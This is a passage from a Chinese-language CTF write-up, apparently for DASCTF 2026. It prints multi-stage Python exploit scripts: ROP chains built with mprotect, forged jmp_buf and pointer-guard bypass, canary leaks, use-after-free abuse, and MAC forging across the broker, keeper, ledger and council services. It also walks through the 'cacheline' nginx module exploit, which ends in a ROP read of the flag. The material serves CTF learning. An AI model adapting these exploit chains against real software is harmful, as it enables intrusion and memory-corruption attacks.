    print('[*] pie=%#x libc=%#x io_ptr=%#x rbp=%#x'%(pie,libc,io_ptr,rbp))
    if libc & 0xfff: print('[!] libc not aligned'); return None
    if not (0x7f0000000000 <= io_ptr < 0x800000000000): print('[!] io_ptr odd'); return None
    # chain
    chain=bytearray(768)
    def put(o,v): struct.pack_into('<Q',chain,o,v)
    put(0x100,0xdeadbeef)
    o=0x108
    put(o,libc+OFF_POP_RDI); o+=8
    put(o,canvas & ~0xfff); o+=8
    put(o,libc+OFF_POP_RSI); o+=8
    put(o,0x2000); o+=8
    put(o,libc+OFF_POP_RDX_R12); o+=8
    put(o,7); o+=8
    put(o,0x4141414141414141); o+=8
    put(o,libc+OFF_MPROTECT); o+=8
    put(o,canvas+0x200); o+=8
    stub=W2.build_stub(canvas,STAGE2_LEN)
    chain[0x200:0x200+len(stub)]=stub
    c.send('T',bytes(chain)); r=c.st()
    if r!=b'OK\n': print('Tc fail',r); return None
    c.send('U'); r=c.st()
    if r!=b'OK\n': print('U fail',r); return None
    enc=page^rbp; b=enc.to_bytes(8,'little')
    for idx,seg in ((0,b[0:3]),(1,b[3:6])):
        c.send('C',bytes([idx])+seg); r=c.st()
        if r!=b'OK\n': print('C2 fail',r); return None
    payload=struct.pack('<Q',canvas+0x100)+struct.pack('<Q',pie+PIE_LEAVE_RET)+b'\x00\x00'
    c.send('E',payload)
    relay=W2.build_relay()
    c.s.sendall(relay+b'\x90'*(STAGE2_LEN-len(relay)))
    try:
        g=c.s.recv(6)
        print('[*] greeting:',g)
        if g==b'MBRK2\n': print('[+] REMOTE worker->broker relay UP'); return c
    except Exception as e: print('no greet',e)
    return None
if __name__=='__main__':
    run()
```

broker 中继的代码如下。

```python
import struct, time, sys
import broker3 as b3
import rw2
from broker3 import st,A,X,P,W,Z,Y,J,enc,recover_H0,OFF_H2,OFF_H4,OFF_H5,ENV_OFF
from broker3 import LC_READ,LC_WRITE,LC_POP_RDI,LC_POP_RSI,LC_POP_RDX_R12,LC_MPROTECT
def ror(x,n): return ((x>>n)|(x<<(64-n)))&((1<<64)-1)
def rol(x,n): return ((x<<n)|(x>>(64-n)))&((1<<64)-1)
GSET=0x4f38-0x4e00; GSETW=0x4ef8-0x4e00; GSETM=0x4f70-0x4e00
def broker(io, log=print, stage2_len=0x400):
    assert Z(io)==b'OK\n'
    H0=recover_H0(io)
    H2=H0+OFF_H2; H4=H0+OFF_H4; H5=H0+OFF_H5
    env=H0+ENV_OFF
    log('[*] broker H0=%#x env=%#x'%(H0,env))
    assert W(io,13,0,enc(H2,env))==b'OK\n'
    assert A(io,0,3,b'')==b'OK\n'
    assert A(io,1,3,b'')==b'OK\n'
    jb=b''.join(P(io,1,o) for o in range(0,0x48,8))
    q=[struct.unpack('<Q',jb[i:i+8])[0] for i in range(0,0x48,8)]
    pie=q[3]-0x26fe
    guard=ror(q[7],17)^(pie+0x234f)
    rsp_plain=ror(q[6],17)^guard
    log('[*] broker pie=%#x guard=%#x rsp_plain=%#x'%(pie,guard,rsp_plain))
    if not (0x7f0000000000 <= rsp_plain < 0x800000000000):
        log('[!] guard sanity fail'); return None
    if ((q[4]-pie)&0xffffffffffffffff)!=0x4cc0:
        log('[!] pie crosscheck fail'); return None
    assert Y(io)==b'OK\n'
    assert W(io,15,0,enc(H5,pie+0x5040))==b'OK\n'
    assert A(io,2,0,b'')==b'OK\n'
    rec=bytearray(0x1c0)
    struct.pack_into('<Q',rec,0x180,env); struct.pack_into('<Q',rec,0x188,0x1000)
    struct.pack_into('<I',rec,0x190,1); struct.pack_into('<I',rec,0x194,1); struct.pack_into('<I',rec,0x198,1)
    struct.pack_into('<Q',rec,0x1a0,pie+0x4e00); struct.pack_into('<Q',rec,0x1a8,0x1000)
    struct.pack_into('<I',rec,0x1b0,1); struct.pack_into('<I',rec,0x1b4,1); struct.pack_into('<I',rec,0x1b8,1)
    assert A(io,3,0,bytes(rec))==b'OK\n'
    def got(off): return struct.unpack('<Q',P(io,13,off))[0]
    rd=got(GSET); wr=got(GSETW); ma=got(GSETM)
    libc=rd-LC_READ
    log('[*] GOT read=%#x write=%#x malloc=%#x -> libc=%#x (woff=%#x moff=%#x)'%(rd,wr,ma,libc,wr-libc,ma-libc))
    heap_page=H0 & ~0xfff
    chain_addr=env+0x100
    first=libc+LC_POP_RDI
    chain=[heap_page, libc+LC_POP_RSI, 0x2000, libc+LC_POP_RDX_R12, 7, 0x4141414141414141,
           libc+LC_MPROTECT,
           libc+LC_POP_RDI, 0, libc+LC_POP_RSI, H0+0x1000, libc+LC_POP_RDX_R12, stage2_len, 0x4242424242424242,
           libc+LC_READ, H0+0x1000]
    vals=[(0x00,0x1111111111111111),(0x08,rol(0x2222222222222222^guard,17)),
          (0x10,0x3333333333333333),(0x18,0x3333333333333333),(0x20,0x3333333333333333),(0x28,0x3333333333333333),
          (0x30,rol(chain_addr^guard,17)),(0x38,rol(first^guard,17)),(0x40,0)]
    for o,v in vals:
        r=W(io,12,o,v)
        if r!=b'OK\n': log('[!] W jmp %#x %r'%(o,r)); return None
    for i,v in enumerate(chain):
        r=W(io,12,0x100+8*i,v)
        if r!=b'OK\n': log('[!] W chain %d %r'%(i,r)); return None
    log('[*] fake jmp_buf staged; J')
    J(io)
    io.s.sendall(b3.build_relay()+b'\x90'*(stage2_len-len(b3.build_relay())))
    time.sleep(0.3)
    return io,pie,libc
class Relay:
    def __init__(self,c):
        self.s=c.s; self.c=c
    def send(self,op,data=b''):
        if isinstance(op,str): op=ord(op)
        self.s.sendall(bytes([op])+struct.pack('>I',len(data))+data)
    def recvn(self,n,timeout=3):
        self.s.settimeout(timeout); b=b''
        while len(b)<n:
            d=self.s.recv(n-len(b))
            if not d: raise EOFError('eof')
            b+=d
        return b
if __name__=='__main__':
    r=rw2.run()
    if not r: raise SystemExit('worker relay fail')
    io=Relay(r)
    out=broker(io)
    if not out: raise SystemExit('broker fail')
    io,pie,libc=out
    # keeper hello through the broker relay
    def ksend(p): io.s.sendall(struct.pack('>H',len(p))+p)
    def krecv(t=5):
        n=struct.unpack('>H',io.recvn(2,t))[0]; return io.recvn(n,t)
    ksend(b'HELLO\n'); print('[*] keeper HELLO:',krecv())
```

中继链驱动的代码如下。

```python
import struct, time, sys
import rw2, rb, keeper as K
def chain(verbose=True):
    log=print if verbose else (lambda *a,**k:None)
    r=rw2.run()
    if not r: return None
    io=rb.Relay(r)
    out=rb.broker(io,log=log)
    if not out: return None
    io,pie_b,libc=out
    def ksend(p): io.s.sendall(struct.pack('>H',len(p))+p)
    def krecv(t=5):
        n=struct.unpack('>H',io.recvn(2,t))[0]; return io.recvn(n,t)
    ksend(b'HELLO\n'); rep=krecv(); secret=int(rep.split(b' ')[1].strip(),16)
    if secret==0: secret=0x7135B9D2468ACE01
    log('[*] keeper secret=%#x'%secret)
    ksend(b'AUDIT %lx|%lx|%lx|%lx'); v=[int(x,16) for x in krecv().split(b'|')]
    canary=v[2]^K.sub_161E(secret); pie=v[1]-0x19b2
    log('[*] keeper pie=%#x canary=%#x'%(pie,canary))
    ksend(b'AUDIT %lx|%lx|%lx|%lx'); krecv()
    ksend(b'COMMIT '+b'A'*264+struct.pack('<Q',canary)+struct.pack('<Q',0xdead)+struct.pack('<Q',pie+0x19b2))
    n=struct.unpack('>H',io.recvn(2,5))[0]; mark=io.recvn(n,5)
    if mark!=b'KEEPER\n': log('[!] marker %r'%mark); return None
    log('[*] keeper relay up')
    # seal
    def ssend(p): io.s.sendall(struct.pack('>H',len(p))+p)
    def srecv(t=5):
        n=struct.unpack('>H',io.recvn(2,t))[0]; return io.recvn(n,t)
    ssend(b'HELLO\n'); rep=srecv(); s=int(rep.split(b' ')[1].strip(),16)
    if s==0: s=0x91A2B3C4D5E6F708
    log('[*] seal secret=%#x'%s)
    def op1(slot): return bytes([1,slot,0])+b'\x00'*5+struct.pack('<Q',0)
    def op2(slot,val): return bytes([2,slot,0])+b'\x00'*5+struct.pack('<Q',val)
    op4=bytes([4,0,0])+b'\x00'*13
    ssend(b'PROGRAM '+op1(0xFE)); srecv(); ssend(b'RUN\n'); tr=srecv()
    pie_s=int(tr.split()[1],16)-0x16c4
    fn=pie_s+0x16f6; mac=K.hash64(s^K.SEAL_CONST)^K.rol64((fn^s)&K.M,21)
    log('[*] seal pie=%#x'%pie_s)
    ssend(b'PROGRAM '+op2(0xFE,fn)+op2(0xFF,mac)+op4); srecv(); ssend(b'RUN\n')
    lg=srecv()
    if lg!=b'LEDGER\n': log('[!] seal gate %r'%lg); return None
    log('[+] LEDGER: raw relay to routeledger')
    return io,secret,pie
if __name__=='__main__':
    r=chain()
    if not r: raise SystemExit('chain fail')
    io,_,_=r
    # routeledger 0x7F leak check (u32 LE size)
    q0=893667148|(0x7F<<32)
    io.s.sendall(struct.pack('<I',16)+struct.pack('<Q',q0)+struct.pack('<Q',1<<32))
    hdr=io.recvn(4,4); n=struct.unpack('<I',hdr)[0]; body=io.recvn(n,4)
    print('[*] RL 0x7F:',hdr.hex(),body.hex())
```

账本协议的代码如下。

```python
import struct, time, sys
import rk
M=(1<<64)-1
C1=0xBF58476D1CE4E5B9; C2=0x94D049BB133111EB; GOLD=0x9E3779B97F4A7C15
def rol(x,n): n&=63; return ((x<<n)|(x>>((64-n)&63)))&M
def ror(x,n): n&=63; return ((x>>n)|(x<<((64-n)&63)))&M
def mix(x):
    x&=M; v=(C1*(x^(x>>30)))&M; w=(C2*(v^(v>>27)))&M
    return (w^(w>>31))&M
def sub2ab0(a1,a2,a3,a4,a5,K):
    K0,K1,K2,K3=K
    v6=K1^a3^GOLD; v7=a1^a2^K0; v8=K3^a5^C2; v9=K2^a4^0xD1B54A32D192ED03; v5=a1&M
    for _ in range(8):
        v10=(v6+v7)&M; v11=(v8+v9)&M; v12=v10^rol(v6,13); v13=v11^rol(v8,16)
        v14=(v12+v11)&M; v15=(v13+rol(v10,32))&M; v6=v14^rol(v12,17); v9=rol(v14,32)
        v8=v15^rol(v13,21); v16=(v8+v5)&M; v5=(v5+1)&M; v7=mix(v16)^v15
    return mix(v7^v9^a1^v8^v6)
MAGIC=0x3544474C
class RLF:
    def __init__(self,io): self.io=io; self.seq=0
    def fr(self,cmd,a5=0,a6=0,payload=b'',timeout=5):
        self.seq+=1
        body=struct.pack('<IIII',MAGIC, (cmd|(a5<<8)|(a6<<16))&0xffffffff, len(payload), self.seq)+payload
        pkt=struct.pack('<I',len(body))+body
        self.io.s.sendall(pkt)
        hdr=self.io.recvn(4,timeout); n=struct.unpack('<I',hdr)[0]
        d=self.io.recvn(n,timeout)
        if len(d)<16: return {'cmd':-1,'plen':0,'payload':b'','raw':d}
        magic,cmdh,plen,seq=struct.unpack('<IIII',d[:16])
        return dict(cmd=cmdh&0xff,a5=(cmdh>>8)&0xff,a6=(cmdh>>16)&0xff,plen=plen,seq=seq,payload=d[16:16+plen],raw=d)
def l_blk(op,slot,arg,idx):
    b=bytearray(16); b[0]=op; b[1]=slot; b[2]=arg&0xff
    struct.pack_into('<H',b,4,((16*slot)^(115*idx)^(arg&0xff)^(op<<8)^0x5D39)&0xffff)
    return bytes(b)
def l_read6(rl,slot,start):
    a2ct=b'!2CT'; blocks=[l_blk(a2ct[slot],slot,start&0xff,0)]; bi=1
    for rr in range(6):
        blocks.append(l_blk(0x71,slot,0,bi)); bi+=1
        blocks.append(l_blk(0x83,slot,0,bi)); bi+=1
        if rr<5: blocks.append(l_blk(0x94,slot,0,bi)); bi+=1
    blocks.append(l_blk(0xa6,slot,0,bi))
    return rl.fr(0x10,slot,0,b''.join(blocks))
TAGN={'LGNONCE5':0x3545434E4F4E474C,'LGEPOCH5':0x3548434F5045474C,'LGLKEY05':0x353059454B4C474C,
      'LGLKEY15':0x353159454B4C474C,'LGLKEY25':0x353259454B4C474C,'LGLKEY35':0x353359454B4C474C,
      'LGSALT05':0x3530544C4153474C,'LGSALT15':0x3531544C4153474C,'LRANSCR5':0x355243534E41524C}
def unlock(rl,log=print):
    r=rl.fr(0x7F); q=struct.unpack('<6Q',r['payload']); F=q[:4]
    log('[*] ledger HELLO cmd=%#x F=%r'%(r['cmd'],[hex(x) for x in F]))
    tab=[None]*24; commits=[]
    for slot in range(4):
        start=-24+6*slot
        rr=l_read6(rl,slot,start)
        if rr['cmd']!=0x80:
            log('[!] ledger read fail slot %d cmd=%#x pay=%s'%(slot,rr['cmd'],rr['payload'][:32].hex())); return None
        outs=struct.unpack('<6Q',rr['payload']); commits.append((slot,outs))
        for i in range(6):
            key=mix((slot<<32)|i); rot=(9*slot+7+i)&63
            tab[start+i+24]=ror(outs[i],rot)^F[slot]^key
    log('[*] table read ok')
    def val(name):
        k=tab.index(TAGN[name]); return tab[k+1]
    A=val('LGNONCE5')^mix(F[0]^TAGN['LGNONCE5'])
    B=val('LGEPOCH5')^mix(A^TAGN['LGEPOCH5'])
    K0=val('LGLKEY05')^mix(A^B^TAGN['LGLKEY05'])
    K1=val('LGLKEY15')^mix(A^K0^TAGN['LGLKEY15'])
    K2=(val('LGLKEY25')+mix((B+K1+TAGN['LGLKEY25'])&M))&M
    K3=val('LGLKEY35')^mix(A^TAGN['LGLKEY35'])^rol(K2,27)
    E0=val('LGSALT05')^mix(K0^TAGN['LGSALT05'])
    E1=val('LGSALT15')^mix(K3^TAGN['LGSALT15'])
    K=(K0,K1,K2,K3)
    G=val('LRANSCR5')^sub2ab0(TAGN['LRANSCR5'],E0,E1,A,0,K)
    MOD=0x35564D444F4D474C
    for slot,outs in commits:
        h=sub2ab0((slot^MOD)&M,outs[0],outs[1],outs[4],outs[5],K)
        G=mix(G^h)
    q0=sub2ab0(0x354B434F4C4E554C,A,B,G,E0,K)
    q1=sub2ab0(0x354B434F4C4E544C,q0,E1,F[0],F[3],K)
    log('[*] secrets A=%#x B=%#x K=%r E0=%#x E1=%#x G=%#x'%(A,B,tuple(hex(x) for x in K),E0,E1,G))
    rr=rl.fr(0x11,0,0,struct.pack('<QQ',q0,q1))
    log('[*] UNLOCK resp cmd=%#x plen=%d pay=%s'%(rr['cmd'],rr['plen'],rr['payload'][:32].hex()))
    if rr['cmd']!=0x81: return None
    return dict(A=A,B=B,K=K,E0=E0,E1=E1,G=G,F=F,tab=tab,commits=commits)
def lck(rl,exp,cmd,a5=0,a6=0,payload=b'',log=print):
    r=rl.fr(cmd,a5,a6,payload)
    log('[*] cmd %#x -> %#x plen=%d %s'%(cmd,r['cmd'],r['plen'],r['payload'][:24].hex()))
    if r['cmd']!=exp: raise RuntimeError('expect %#x got %#x'%(exp,r['cmd']))
    return r
def permits(rl,S,log=print):
    A,B,K,E0,E1,G,F=S['A'],S['B'],S['K'],S['E0'],S['E1'],S['G'],S['F']
    lck(rl,0x90,0x20); lck(rl,0x91,0x21)
    r=lck(rl,0x92,0x22); uaf=struct.unpack('<5Q',r['payload'])
    LTAG=0x35464E414D474C52
    H1x=sub2ab0((LTAG^0x10)&M,B,A,1,G,K)
    addr6270=uaf[3]^H1x
    B1=(uaf[2]^mix(1^A^LTAG))&M
    log('[*] uaf=%r addr6270=%#x B1=%#x'%([hex(x) for x in uaf],addr6270,B1))
    addr6070=addr6270-0x200
    prot=addr6270^(B1>>12)
    mac=sub2ab0(0x35464E414D474C62,prot,B1,addr6270,G,K)
    lck(rl,0x93,0x23,0,0,struct.pack('<QQ',prot,mac))
    LP=bytearray(0x98)
    def lq(o,x): struct.pack_into('<Q',LP,o,x&M)
    lq(0,0x3554494D5245504C); lq(8,5); lq(0x10,A); lq(0x18,B); lq(0x20,addr6270); lq(0x28,addr6070); lq(0x30,G)
    h1=sub2ab0(0x3554494D5245505C,A,B,addr6270,addr6070,K)
    h2=sub2ab0(0x3554494D5245506C,G,h1,E0,E1,K)
    h3=sub2ab0(0x3554494D5245507C,h1,h2,addr6270,G,K)
    h4=sub2ab0(0x3554494D5245500C,h2,h3,addr6070,B,K)
    macl=E1^E0^h1^rol(h2,11)^rol(h3,29)^ror(h4,17)
    lq(0x38,h1); lq(0x40,h2); lq(0x48,h3); lq(0x50,h4); lq(0x58,macl); lq(0x60,1)
    pay=bytearray(0x130); pay[0x98:0x98+0x98]=LP
    lck(rl,0x94,0x24,0,0,bytes(pay))
    lck(rl,0xA0,0x30); lck(rl,0xA1,0x31)
    r=lck(rl,0xA2,0x32); uaf2=struct.unpack('<5Q',r['payload'])
    RTAG=0x35594C4552474C52
    H1y=sub2ab0((RTAG^0x10)&M,B,A,1,G,K)
    addr6070b=uaf2[3]^H1y
    R1=(uaf2[2]^mix(1^A^RTAG))&M
    log('[*] uaf2=%r addr6070b=%#x R1=%#x'%([hex(x) for x in uaf2],addr6070b,R1))
    prot2=addr6070b^(R1>>12)
    mac2=sub2ab0(0x35594C4552474C62,prot2,R1,addr6070b,macl,K)
    lck(rl,0xA3,0x33,0,0,struct.pack('<QQ',prot2,mac2))
    RP=bytearray(0x1F8)
    def rq2(o,x): struct.pack_into('<Q',RP,o,x&M)
    rq2(0,0x3559414C45524C52); rq2(8,5); rq2(0x10,A); rq2(0x18,B); rq2(0x20,addr6270); rq2(0x28,macl); rq2(0x30,G); rq2(0x38,3)
    g1=sub2ab0(0x3559414C45524C42,A,B,addr6270,macl,K)
    g2=sub2ab0(0x3559414C45524C72,G,3,E1,g1,K)
    g3=sub2ab0(0x3559414C45524C62,g1,g2,addr6070,h3,K)
    g4=sub2ab0(0x3559414C45524C12,g2,g3,h4,A,K)
    macg=g1^macl^rol(g2,13)^rol(g3,31)^ror(g4,11)
    rq2(0x40,g1); rq2(0x48,g2); rq2(0x50,g3); rq2(0x58,g4); rq2(0x60,macg); rq2(0x68,1)
    pay2=bytearray(0x3F0); pay2[0x1F8:0x1F8+0x1F8]=RP
    lck(rl,0xA4,0x34,0,0,bytes(pay2))
    r=lck(rl,0xB0,0x40)
    log('[+] PERMIT OK: %s'%r['payload'][:64].hex())
    return dict(addr6270=addr6270,addr6070=addr6070,macl=macl,h3=h3,h4=h4,macg=macg)
def council(rl,cmd,payload=b'',seq=1,log=print):
    cfr=struct.pack('<IIII',0x35434E52,cmd,len(payload),seq)+payload
    r=rl.fr(0x60,0,0,cfr,timeout=5)
    log('[*] COUNCIL relay req %#x -> cmd=%#x plen=%d raw=%s'%(cmd,r['cmd'],r['plen'],r['payload'][:64].hex()))
    return r
if __name__=='__main__':
    r=rk.chain()
    if not r: raise SystemExit('chain fail')
    io,_,_=r
    rl=RLF(io)
    S=unlock(rl)
    if not S: raise SystemExit('unlock fail')
    permits(rl,S)
    council(rl,0x7F)
```

议会主链的代码如下。

```python
import struct, sys, time
import rk, rledger
M=(1<<64)-1
C1=0xBF58476D1CE4E5B9; C2=0x94D049BB133111EB
def rol(x,n):
    n&=63; return ((x<<n)|(x>>((64-n)&63)))&M if n else x&M
def ror(x,n):
    n&=63; return ((x>>n)|(x<<((64-n)&63)))&M if n else x&M
def mix(x):
    x&=M; h=(C1*(x^(x>>30)))&M; w=(C2*(h^(h>>27)))&M; return (w^(w>>31))&M
def mix2(y):
    y&=M; w=(C2*(y^(y>>27)))&M; return (w^(w>>31))&M
def sub2600(a1,a2,a3,a4,a5,K):
    K0,K1,K2,K3=K
    v6=K1^a3^0x243F6A8885A308D3
    v7=K2^a4^0x13198A2E03707344
    v8=a1^K0^a2
    v9=K3^a5^0xA4093822299F31D0
    v5=0
    for _ in range(10):
        v10=(rol(v6,7)+v8)&M
        v11=v9
        v9=v6^rol(v7,19)
        v6=v11^ror(v10,21)
        v12=(v5+rol(v11,31))&M
        x=(v10^v5^a1)&M
        v13=(C1*(x^(x>>30)))&M
        v5+=1
        y=(v9+v7+v12)&M
        v14=(C1*(y^(y>>30)))&M
        v8=mix2(v13); v7=mix2(v14)
    X=(v7^v8^v6^v9^a1)&M
    return mix(X)
class CC:
    def __init__(self,rl): self.rl=rl; self.seq=0
    def fr(self,cmd,a5=0,a6=0,payload=b'',timeout=8):
        self.seq+=1
        cfr=struct.pack('<IIII',0x35434E52, (cmd|(a5<<8)|(a6<<16))&0xffffffff, len(payload), self.seq)+payload
        r=self.rl.fr(0x60,0,0,cfr,timeout=timeout)
        d=r['payload']
        if len(d)<16: return dict(magic=0,cmd=-1,a5=0,a6=0,plen=0,seq=0,payload=d)
        m,c,pl,sq=struct.unpack('<IIII',d[:16])
        return dict(magic=m,cmd=c&0xff,a5=(c>>8)&0xff,a6=(c>>16)&0xff,plen=pl,seq=sq,payload=d[16:16+pl])
def run(log=print):
    r=rk.chain()
    if not r: raise SystemExit('chain fail')
    io,_,_=r
    rl=rledger.RLF(io)
    S=rledger.unlock(rl,log=log)
    if not S: raise SystemExit('unlock fail')
    rledger.permits(rl,S,log=log)
    c=CC(rl)
    r=c.fr(0x7F); q=struct.unpack('<4Q',r['payload'])
    log('[*] COUNCIL HELLO cmd=%#x %r'%(r['cmd'],[hex(x) for x in q]))
    Q5078=q[0]; q1=q[1]; q2=q[2]
    tab=[None]*16
    for k,a5 in enumerate([0xFC,0xFD,0xFE,0xFF]):
        r=c.fr(0x10,a5,0,b'')
        if r['cmd']!=0x80:
            log('[!] round %d cmd=%#x plen=%d'%(k,r['cmd'],r['plen'])); return None
        outs=struct.unpack('<4Q',r['payload'])
        for idx in range(4):
            key=mix((idx | (k<<32))&M); rot=(11*k+5+idx)&63
            tab[4*k+idx]=ror(outs[idx],rot)^Q5078^key
    log('[*] COUNCIL TABLE16 %r'%[hex(x) for x in tab])
    TAGS={'CCNONCE5':0x3545434E4F4E4343,'CCTICKT5':0x35544B4349544343,'CNCKEY05':0x353059454B434E43,'CNCKEY15':0x353159454B434E43,'CNCKEY25':0x353259454B434E43,'CNCKEY35':0x353359454B434E43,'CNCALT05':0x3530544C41434E43,'CNCALT15':0x3531544C41434E43}
    def val(n):
        k=tab.index(TAGS[n]); return tab[k+1]
    C8=val('CCNONCE5')^mix(Q5078^TAGS['CCNONCE5'])
    C0=val('CCTICKT5')^mix(C8^TAGS['CCTICKT5'])
    A0=val('CNCKEY05')^mix(C0^C8^TAGS['CNCKEY05'])
    A8=val('CNCKEY15')^mix(A0^C8^TAGS['CNCKEY15'])
    B0=(val('CNCKEY25')+mix((C0+A8+TAGS['CNCKEY25'])&M))&M
    B8=val('CNCKEY35')^mix(C8^TAGS['CNCKEY35'])^rol(B0,25)
    K=(A0,A8,B0,B8)
    F0=val('CNCALT05')^sub2600(TAGS['CNCALT05'],C8,C0,A0,0,K)
    F1=val('CNCALT15')^sub2600(TAGS['CNCALT15'],C0,C8,B8,0,K)
    log('[*] COUNCIL SECRETS C8=%#x C0=%#x K=%r F0=%#x F1=%#x'%(C8,C0,tuple(hex(x) for x in K),F0,F1))
    H1h=sub2600(0x35454C4341524F53,C8,C0,Q5078,0,K)
    H2h=sub2600(0x35454C4341524F63,C0,C8,Q5078,0,K)
    sub2740_=q1^H1h; addr50d0=q2^H2h; PIE=addr50d0-0x50D0
    ok=(sub2740_==PIE+0x2740)
    log('[*] COUNCIL PIE=%#x sub2740=%#x check=%s'%(PIE,sub2740_,ok))
    if not ok: return None
    def putq(buf,o,x): struct.pack_into('<Q',buf,o,x&M)
    def getq(buf,o): return struct.unpack('<Q',buf[o:o+8])[0]
    PTAG=0x354E414C50434E43
    P=bytearray(0x200)
    for i in range(32):
        putq(P,8*i, sub2600((i^PTAG)&M, C8, C0, F0 if (i&1)==0 else F1, i, K))
    v6=(C0^C8^PTAG)&M
    for i in range(32):
        v9=(i ^ rol(getq(P,8*i), 3+7*i))&M
        v6=mix(v6^v9)
    putq(P,0x100,0x35544D5250434E43)
    putq(P,0x108,C8); putq(P,0x110,C0)
    putq(P,0x118,PIE+0x5360); putq(P,0x120,PIE+0x50D0); putq(P,0x128,PIE+0x2740)
    putq(P,0x130,v6)
    GH1=sub2600(0x35544D5250434E53,C8,C0,PIE+0x5360,PIE+0x50D0,K)
    GH2=sub2600(0x35544D5250434E63,PIE+0x2740,v6,F0,F1,K)
    GH3=sub2600(0x35544D5250434E73,GH1,GH2,PIE+0x5360,Q5078,K)
    GH4=sub2600(0x35544D5250434E03,GH2,GH3,PIE+0x50D0,C0,K)
    GMAC=ror(GH4,19)^rol(GH3,27)^rol(GH2,9)^GH1^v6
    putq(P,0x138,GH1); putq(P,0x140,GH2); putq(P,0x148,GH3); putq(P,0x150,GH4)
    putq(P,0x158,GMAC); putq(P,0x160,1)
    payload=b''.join(bytes([1,b]) for b in P)
    r=c.fr(0x20,0,0,payload)
    log('[*] PLAN RESP %#x plen=%d'%(r['cmd'],r['plen']))
    if r['cmd']!=0x90: return None
    plan_mac=GMAC
    def ck(exp,cmd,a5=0,a6=0,payload=b''):
        rr=c.fr(cmd,a5,a6,payload)
        if rr['cmd']!=exp:
            log('[!] expect %#x got %#x plen=%d %s'%(exp,rr['cmd'],rr['plen'],rr['payload'][:16].hex())); raise RuntimeError('gate')
        return rr
    ck(0xA0,0x30); ck(0xA1,0x31)
    r=ck(0xA2,0x32); u=struct.unpack('<5Q',r['payload'])
    BTAG=0x35544F4C4C414243
    R1=(u[2]^mix(1^C8^BTAG))&M
    log('[*] COUNCIL UAF=%r R1=%#x'%([hex(x) for x in u],R1))
    prot2=(PIE+0x50D0)^(R1>>12)
    mac2=sub2600(0x35544F4C4C414273,prot2,R1,PIE+0x50D0,plan_mac,K)
    ck(0xA3,0x33,0,0,struct.pack('<QQ',prot2,mac2))
    G=bytearray(0x178)
    putq(G,0x00,0x3545544147434E43)
    putq(G,0x08,C8); putq(G,0x10,C0); putq(G,0x18,PIE+0x5360); putq(G,0x20,plan_mac)
    X=(PIE+0x2C90)^(PIE+0x50D0)^C0^B0
    f58=(rol(X,23)+A0)&M
    putq(G,0x28,f58)
    V1=sub2600(0x3545544147434E53,C8,C0,PIE+0x5360,plan_mac,K)
    V2=sub2600(0x3545544147434E63,f58,PIE+0x50D0,F0,F1,K)
    V3=sub2600(0x3545544147434E73,V1,V2,GH3,GH4,K)
    V4=sub2600(0x3545544147434E03,V2,V3,Q5078,C0,K)
    VMAC=ror(V4,13)^ror(V3,31)^rol(V2,15)^V1^plan_mac
    putq(G,0x30,V1); putq(G,0x38,V2); putq(G,0x40,V3); putq(G,0x48,V4); putq(G,0x50,VMAC); putq(G,0x58,1)
    pay2=bytearray(0x2F0); pay2[0x178:0x178+0x178]=G
    ck(0xA4,0x34,0,0,bytes(pay2))
    r=c.fr(0x40,0,0,b'')
    log('[+] COUNCIL GATE RESP %#x plen=%d'%(r['cmd'],r['plen']))
    log('[*] COUNCIL RAW PAYLOAD: %r'%r['payload'])
    return r['payload']
if __name__=='__main__':
    out=run()
    if out:
        print('FLAGPAYLOAD',out)
        print('FLAGPAYLOAD_HEX',out.hex())
```

### cacheline

cacheline是一道 nginx 模块题。nginx worker 通过 cacheline.so 处理 HTTP 请求，参数为操作与数据，远程挂载点不是根路径而是缓存路径；模块后面是 uid 1001 的 broker 与 uid 1002 的 vault，两者通过 unix socket 通信。模块内部是一个状态机，依次经过创建、调整大小、打开账本、信标与账本、路由、封存、授权、凭证与提交；状态机把请求池中已经释放的对象保存为全局悬空指针，这是整个利用的根因。

信息泄露分几步完成。信标与账本阶段可以泄露模块 PIE 基址、每个 worker 的密钥以及连接对象指针；提交阶段使用判别值 1 会启动 broker 中继；broker 的读操作可以泄露代理函数地址与两个全局指针，回显的 cookie 可以恢复堆指针；伪造许可、授权与四组分片之后，计算出的调用目标会被引导到 vault 的入口代理函数。进入 vault 后利用其字节码解释器的类型混淆：解释器用有符号字符与 64 位累加器处理立即数，通过检查后，负的立即数会被当作相对根对象的四字索引读取；利用负 3、负 2、负 1 可以分别泄露中间值、根指针与 vault 的 PIE 基址。有了这些信息就能计算四把根密钥与第二阶段密码，伪造 12 个对象，把计划对象偏移 0x40 处的指针指向 base 加 0x44e0 的 lea rsp,\[rdi+0x40\]; ret 跳板，再用四个分片载荷拼成 ROP：read(7,.bss, 0x100) 后 write(1,.bss, 0x100)，把 flag 打印到连接上。

本地在 broker 与 vault 预加载布局打乱的情况下也完整验证通过；远程 nginx 实际没有预加载布局打乱，因此使用未打乱路径，第一次尝试即成功，得到 DASCTF{69107165859971918714064961070761}。这是一道典型对象生命周期加状态机题：单个操作只是越界读写，但按状态机顺序组合后，悬空对象就变成可控的调用目标；vault 的负数索引读是第二个关键点，它把解释器的类型混淆变成完整的信息泄露与 ROP 起点。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

全链利用脚本的代码如下。

```python
#!/usr/bin/env python3
# cacheline (DASCTF 2026, id 12078) full-chain exploit.
#
# Path: HTTP (keepalive) -> nginx cacheline.so module state machine ->
#       broker object graph -> vault object graph -> arbitrary call -> ROP
#       -> read(flag fd 7) -> write(1).
#
# Layers:
#  1) module leaks sub_2199 (PIE), K1=qword_6608, K2=qword_6610 and the
#     ngx_connection_t pointer from the beacon/ledger responses; drives
#     route/seal/grant/voucher; commit v39=1 arms the broker relay
#     (sub_1AEF sets qword_61E0 to this connection).
#  2) broker V commands leak sub_4000, K1=qword_7088, K2=qword_7090. Permit
#     and mandate are forged (qword_7080 chain + hashes) so the C commit
#     calls sub_4000, which connects to the vault and relays.
#  3) vault root object is leaked through the signed-char index bug in the
#     op1 bytecode interpreter (root-relative reads at -3/-2/-1 give
#     root+0=v6, root+8=root pointer, root+16=sub_17F0+PIE base). All root
#     keys are derived, op2 auth is passed, and a fully forged
#     ticket/credential/context/plan + 4 shard/seal pairs make plan+40
#     point at `lea rsp,[rdi+0x40]; ret`. The four shard 256-byte chunks
#     become the ROP stack; read(7,bss,0x100); write(1,bss,0x100).
import argparse
import re
import socket
import struct
import sys
import time

M64 = (1 << 64) - 1
C1 = 0x9E3779B97F4A7C15
C2 = 0x517CC1B727220A95
C3 = 0x6A09E667F3BCC909
